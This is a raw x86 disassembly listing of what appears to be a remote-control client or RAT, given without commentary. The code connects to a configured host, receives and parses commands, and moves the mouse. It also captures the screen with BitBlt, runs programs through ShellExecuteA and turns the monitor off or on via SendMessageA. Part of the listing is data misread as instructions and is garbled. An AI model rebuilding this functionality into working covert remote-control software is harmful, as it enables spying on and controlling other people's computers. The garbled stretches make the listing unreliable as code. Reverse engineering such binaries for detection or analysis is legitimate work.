call sub_475ecc
push 0x0
push 0x1
lea eax [ ebp - 0x2010 ]
push eax
push esi
call recv
inc eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x201c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_464de0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x44 ]
mov eax [ ebp - 0x10 ]
call sub_464e70
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
push 0x0
push 0x2000
lea eax [ ebp - 0x2010 ]
push eax
push esi
call recv
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_464efc
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_41b734
mov eax r-xdata
call sub_475e2c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
push 0x0
push ebx
lea eax [ ebp - 0x2010 ]
push eax
push esi
call send
push 0x0
push 0x2000
lea eax [ ebp - 0x2010 ]
push eax
push esi
call recv
test ebx ebx
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_41beb4
mov edx r-xdata
mov eax esi
call sub_475f68
lea eax [ ebp - 0x2010 ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
lea edx [ ebp - 0x2010 ]
mov ecx 0x2000
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
je r-xdata
sub_487e9c
push ebx
mov ebx eax
cmp [ ebx + 0x50 ] 0x0
je r-xdata
cmp [ ebx + 0x51 ] 0x0
je r-xdata
mov al 0x1
call sub_489e9c
cmp [ ebx + 0x52 ] 0x0
je r-xdata
mov al 0x1
call sub_489ff0
cmp [ ebx + 0x53 ] 0x0
je r-xdata
xor eax eax
call sub_48b1a0
pop ebx
retn
push 0xffffffff
push 0xf170
push 0x112
push 0xffff
call SendMessageA
sub_487ee4
push ebx
mov ebx eax
cmp [ ebx + 0x50 ] 0x0
je r-xdata
cmp [ ebx + 0x51 ] 0x0
je r-xdata
xor eax eax
call sub_489e9c
cmp [ ebx + 0x52 ] 0x0
je r-xdata
xor eax eax
call sub_489ff0
cmp [ ebx + 0x53 ] 0x0
je r-xdata
push 0x2
push 0xf170
push 0x112
push 0xffff
call SendMessageA
pop ebx
retn
mov al 0x1
call sub_48b1a0
sub_487f2c
push ebp
mov ebp esp
push eax
mov eax 0x2
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xffffffd0
push ebx
push esi
xor edx edx
mov [ ebp - 0x2034 ] edx
mov [ ebp - 0x202c ] edx
mov [ ebp - 0x2030 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_488265
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push 0x2
call socket
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je r-xdata
mov eax ebx
call sub_487e9c
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov [ ebp - 0x2028 ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x2026 ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov esi eax
mov [ ebp - 0x2024 ] esi
inc esi
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
call sub_4889d4
test al al
je r-xdata
push 0x10
lea eax [ ebp - 0x2028 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call connect
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call recv
inc eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
push 0x2
mov eax [ ebp - 0xc ]
push eax
call shutdown
mov eax [ ebp - 0xc ]
push eax
call closesocket
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48826c
lea eax [ ebp - 0x2034 ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
lea eax [ ebp - 0x14 ]
call sub_40f944
mov eax [ ebp - 0x18 ]
call sub_4889b4
mov eax [ ebp - 0x18 ]
call sub_41ff18
lea edx [ ebp - 0x2030 ]
mov eax [ ebx + 0x40 ]
call sub_409d70
mov ecx [ ebp - 0x2030 ]
lea eax [ ebp - 0x202c ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x202c ]
mov eax [ ebp - 0xc ]
call sub_475ecc
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call recv
inc eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x2024 ] eax
mov eax [ rw-data ]
mov edx [ ebx + 0x48 ]
call sub_405584
mov eax [ rw-data ]
mov edx [ ebx + 0x44 ]
mov [ eax ] edx
call sub_488b18
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x14 ] eax
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ eax + 0xf ] 0x1
mov dl 0x5
mov eax [ ebp - 0x18 ]
call sub_41fc40
mov edx [ ebx + 0x40 ]
mov eax [ ebp - 0x18 ]
call sub_4889d0
mov eax [ ebp - 0x18 ]
call sub_41fef0
mov eax ebx
call sub_487ee4
jmp r-xdata
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call recv
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
mov ecx [ ebx + 0x4c ]
mov edx [ ebx + 0x48 ]
call sub_488d70
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41b734
lea edx [ ebp - 0x2034 ]
mov eax [ ebp - 0x14 ]
call sub_48cdec
mov eax [ ebp - 0x2034 ]
lea edx [ ebp - 0x4 ]
call sub_45f550
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_405974
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_405974
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_41beb4
push 0x64
call Sleep
cmp [ ebx + 0xd ] 0x0
jne r-xdata
cmp [ ebx + 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4055c8
cmp [ ebx + 0xd ] 0x0
jne r-xdata
push 0x0
push esi
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call send
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call recv
test esi esi
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_41beb4
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_475f68
cmp [ ebx + 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x2018 ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
lea edx [ ebp - 0x2018 ]
mov ecx 0x2000
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
test esi esi
je r-xdata
sub_4882ac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4882ed
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x48 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4882f4
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48830c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48835b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov [ ebx + 0x50 ] 0x0
mov [ ebx + 0x50 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488362
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_488374
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4883c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov [ ebx + 0x52 ] 0x0
mov [ ebx + 0x52 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4883ca
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4883dc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48842b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov [ ebx + 0x51 ] 0x0
mov [ ebx + 0x51 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488432
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_488444
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_488493
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov [ ebx + 0x53 ] 0x0
mov [ ebx + 0x53 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48849a
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4884bc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x85
dec eax
add [ eax ] cl
add [ eax ] al
clc
jg r-xdata
add [ ecx - 0xffb3c ] al
call [ eax + 0x48 ]
add [ eax + 0x78004048 ] bl
sti
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebx + edi * 8 ] al
inc ecx
add [ esp + edi * 8 ] ch
inc ecx
add [ eax * 4 + 0x540e0048 ] bl
dec ecx
outsb
jo r-xdata
jne r-xdata
add esp 0xfffff004
push eax
dec eax
mov eax [ ebp - 0x4 ]
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2044 ] edx
mov [ ebp - 0x2040 ] edx
mov [ ebp - 0x203c ] edx
mov [ ebp - 0x2038 ] edx
mov [ ebp - 0x2034 ] edx
mov [ ebp - 0x202c ] edx
mov [ ebp - 0x2030 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_488943
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push 0x2
call socket
mov ebx eax
mov eax [ ebp - 0xc ]
inc ebx
je r-xdata
fmul [ ebx + 0x5889f445 ]
inc esp
je r-xdata
push 0x2
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x44 ]
push eax
call shutdown
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x44 ]
push eax
call closesocket
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48894a
lea eax [ ebp - 0x2044 ]
mov edx 0x7
call sub_405554
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
mov [ ebp - 0x2028 ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x2026 ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov ebx eax
mov [ ebp - 0x2024 ] ebx
inc ebx
jne r-xdata
inc ebx
outsd
outsb
je r-xdata
push 0x10
lea eax [ ebp - 0x2028 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x44 ]
push eax
call connect
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x44 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
mov [ eax + 0x44 ] ebx
outsd
insb
nop
push ebp
mov ebp esp
push eax
mov eax 0x2
lea edx [ ebp - 0x2030 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x40 ]
call sub_409d70
mov ecx [ ebp - 0x2030 ]
lea eax [ ebp - 0x202c ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x202c ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x44 ]
call sub_475ecc
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x44 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x2024 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x4
call sub_403af4
lea eax [ ebp - 0x2018 ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x44 ]
push eax
call recv
mov ebx eax
test ebx ebx
jle r-xdata
xor eax eax
push ebp
push sub_4888e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
lea edx [ ebp - 0x2018 ]
call sub_405728
lea eax [ ebp - 0x2034 ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x2034 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x2038 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x2038 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x203c ]
push eax
mov ecx 0x5
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x203c ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
sub ecx 0x6
mov edx 0x7
mov eax [ ebp - 0x4 ]
call sub_405a44
push 0x0
mov eax [ ebp - 0x8 ]
call sub_409edc
push eax
push 0x0
push 0x0
push 0x800
call mouse_event
jmp r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x2040 ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x2040 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
sub ecx 0x2
mov edx 0x3
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x8 ]
call sub_461b8c
jmp r-xdata
sub edi 0x4
mov edi [ edi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x2044 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x2044 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
sub ecx 0x5
mov edx 0x6
mov eax [ ebp - 0x4 ]
call sub_405a44
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_488f80
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x14 ]
sub ecx 0x6
mov edx 0x7
mov eax [ ebp - 0x4 ]
call sub_405a44
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_488f80
jmp r-xdata
mov eax [ ebp - 0x14 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x18 ]
sub ecx 0x4
mov edx 0x5
mov eax [ ebp - 0x4 ]
call sub_405a44
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_488f80
mov eax [ ebp - 0x18 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
sub_4888ec
call sub_404f40
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x4
call sub_403af4
lea eax [ ebp - 0x2018 ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x44 ]
push eax
call recv
mov ebx eax
test ebx ebx
jle r-xdata
push 0x2
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x44 ]
push eax
call shutdown
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x44 ]
push eax
call closesocket
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48894a
lea eax [ ebp - 0x2044 ]
mov edx 0x7
call sub_405554
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
xor eax eax
push ebp
push sub_4888e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
lea edx [ ebp - 0x2018 ]
call sub_405728
lea eax [ ebp - 0x2034 ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x2034 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x2038 ]
push eax
mov ecx 0x2
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x2038 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x203c ]
push eax
mov ecx 0x5
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x203c ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
sub ecx 0x6
mov edx 0x7
mov eax [ ebp - 0x4 ]
call sub_405a44
push 0x0
mov eax [ ebp - 0x8 ]
call sub_409edc
push eax
push 0x0
push 0x0
push 0x800
call mouse_event
jmp r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x2040 ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x2040 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
sub ecx 0x2
mov edx 0x3
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x8 ]
call sub_461b8c
jmp r-xdata
sub edi 0x4
mov edi [ edi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x2044 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x2044 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
sub ecx 0x5
mov edx 0x6
mov eax [ ebp - 0x4 ]
call sub_405a44
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_488f80
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x14 ]
sub ecx 0x6
mov edx 0x7
mov eax [ ebp - 0x4 ]
call sub_405a44
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_488f80
jmp r-xdata
mov eax [ ebp - 0x14 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x18 ]
sub ecx 0x4
mov edx 0x5
mov eax [ ebp - 0x4 ]
call sub_405a44
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_488f80
mov eax [ ebp - 0x18 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
sub_4889f0
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x4c ] eax
xor eax eax
push ebp
push sub_488aec
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x48 ] 0x48
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call GetMonitorInfoA
test eax eax
je r-xdata
or ebx 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488af3
lea eax [ ebp - 0x60 ]
mov edx 0x6
call sub_405554
retn
lea eax [ ebp - 0x4c ]
lea edx [ ebp - 0x20 ]
mov ecx 0x20
call sub_4057a0
mov eax [ ebp - 0x4c ]
mov edx [ rw-data ]
call sub_405974
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x40 ]
mov [ rw-data ] eax
push r-xdata
lea edx [ ebp - 0x54 ]
mov eax [ rw-data ]
call sub_409d70
push [ ebp - 0x54 ]
push r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ rw-data ]
call sub_409d70
push [ ebp - 0x58 ]
push r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ rw-data ]
call sub_409d70
push [ ebp - 0x5c ]
push r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ rw-data ]
call sub_409d70
push [ ebp - 0x60 ]
lea eax [ ebp - 0x50 ]
mov edx 0x8
call sub_4058e0
mov eax [ ebp - 0x50 ]
call sub_475e2c
sub_488b18
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_488bac
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
call sub_4059dc
push eax
call CreateDCA
mov ebx eax
push 0x8
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push 0xa
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_409b7c
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
je r-xdata
mov eax r-xdata
call sub_475e2c
push 0x0
push sub_4889f0
push 0x0
push 0x0
call EnumDisplayMonitors
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488bb3
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_488be0
push ebp
mov ebp esp
add esp 0xffffff50
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0xac ] edx
mov [ ebp - 0xb0 ] edx
mov esi eax
lea edi [ ebp - 0xa8 ]
xor eax eax
push ebp
push sub_488cac
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ edi ] 0xa8
xor ebx ebx
mov eax esi
mov edx r-xdata
call sub_405584
jmp r-xdata
push 0x1
push edi
push ebx
push 0x0
call EnumDisplayDevicesA
test eax eax
jne r-xdata
inc ebx
test [ edi + 0xa4 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488cb3
lea eax [ ebp - 0xb0 ]
mov edx 0x2
call sub_405554
retn
push [ esi ]
lea eax [ ebp - 0xac ]
lea edx [ edi + 0x24 ]
mov ecx 0x80
call sub_4057a0
push [ ebp - 0xac ]
push r-xdata
lea eax [ ebp - 0xb0 ]
lea edx [ edi + 0x4 ]
mov ecx 0x20
call sub_4057a0
push [ ebp - 0xb0 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4058e0
sub_488d04
sub eax 0x1
jb r-xdata
push 0x5
push 0x0
push 0x0
push r-xdata
push r-xdata
push 0x0
call ShellExecuteA
retn
je r-xdata
push 0x5
push 0x0
push 0x0
push r-xdata
push r-xdata
push 0x0
call ShellExecuteA
retn
sub eax 0x2
je r-xdata
call sub_461c1c
retn
dec eax
je r-xdata
call sub_461c54
jmp r-xdata
retn
sub_488d70
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_488f5d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call CreateDCA
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_488f38
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push edi
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fb1c
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_488ef9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0x64
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax r-xdata
call sub_45fcf8
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x40 ] 0x1
mov eax [ rw-data ]
push esi
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] 0x1
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x24 ] eax
push 0x0
mov ecx [ esi ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ae0
mov edx eax
test edx edx
je r-xdata
mov eax [ rw-data ]
imul ebx
mov ecx 0x64
cdq
idiv ecx
mov ecx eax
mov eax [ rw-data ]
imul ebx
mov ebx 0x64
cdq
idiv ebx
push 0x0
lea edx [ ebp - 0x1c ]
xchg edx eax
xchg edx ecx
call sub_45fddc
lea eax [ ebp - 0x8 ]
call sub_407024
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_45fa24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488f00
mov eax [ ebp - 0x1c ]
call sub_404650
retn
sub edx 0xffffffec
sub_488f00
xor eax eax
pop edx
pop ecx
pop ecx
